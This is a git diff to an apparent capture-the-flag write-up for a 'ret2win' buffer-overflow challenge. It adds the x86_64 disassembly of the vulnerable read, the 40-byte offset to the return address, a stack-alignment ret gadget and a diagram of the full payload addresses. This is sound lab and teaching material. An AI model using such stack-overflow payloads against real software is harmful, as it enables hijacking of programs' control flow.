@@ -18,7 +18,36 @@ The objective become clear: return from `pwnme` into `ret2win`.
 For all architectures, the buffer overflow is a read of 56 bytes into a 32 bytes buffer.
 
 ## x86_64: (TODO)
+```
+0000000000400733 <pwnme + 0x4b>:
+  400733:	48 8d 45 e0      lea    rax,[rbp-0x20]
+  400737:	ba 38 00 00 00   mov    edx,0x38
+  40073c:	48 89 c6         mov    rsi,rax
+  40073f:	bf 00 00 00 00   mov    edi,0x0
+  400744:	e8 47 fe ff ff   call   400590 <read@plt>
+...
 
+0000000000400754 <pwnme + 0x6c>:
+  400754:	c9               leave
+  400755:	c3               ret
+```
+We have only the 32 bytes for the buffer, so it will only take 40 bytes to reach the return address.
+However, this is a x64 challenge so the stack pointer has to be 16-byte aligned when returning
+from functions. To avoid a segfault on an aligned memory move, we can stick the address of a `ret`
+instruction before the ret2win address.
+```
+┌─────────────────────────┐┌─────────────────────────┐
+│ buffer                  ││ 20 20 20 20 20 20 20 20 │ <- padding (40 bytes)
+│                         ││ 20 20 20 20 20 20 20 20 │
+│                         ││ 20 20 20 20 20 20 20 20 │
+├─────────────────────────┤│ 20 20 20 20 20 20 20 20 │
+│ old_rbp                 ││ 20 20 20 20 20 20 20 20 │
+├─────────────────────────┤├─────────────────────────┤
+│ ret                     ││ 0x400755                │ <- ret
+├─────────────────────────┤├─────────────────────────┤
+│ ...                     ││ 0x400756                │ <- ret2win address
+└─────────────────────────┘└─────────────────────────┘
+```
 ## x86:
 ```
 08048609 <pwnme + 0x5c>:
@@ -43,7 +72,7 @@ at `buffer + 0x28 + 0x4 = buffer + 44`. Thus we need 44 bytes of padding, then t
 │             │ │ 20 20 20 20 │
 │             │ │ 20 20 20 20 │
 ├─────────────┤ │ 20 20 20 20 │
-│ ..          │ │ 20 20 20 20 │
+│ ...         │ │ 20 20 20 20 │
 ├─────────────┤ │ 20 20 20 20 │
 │ ...         │ │ 20 20 20 20 │
 ├─────────────┤ │ 20 20 20 20 │
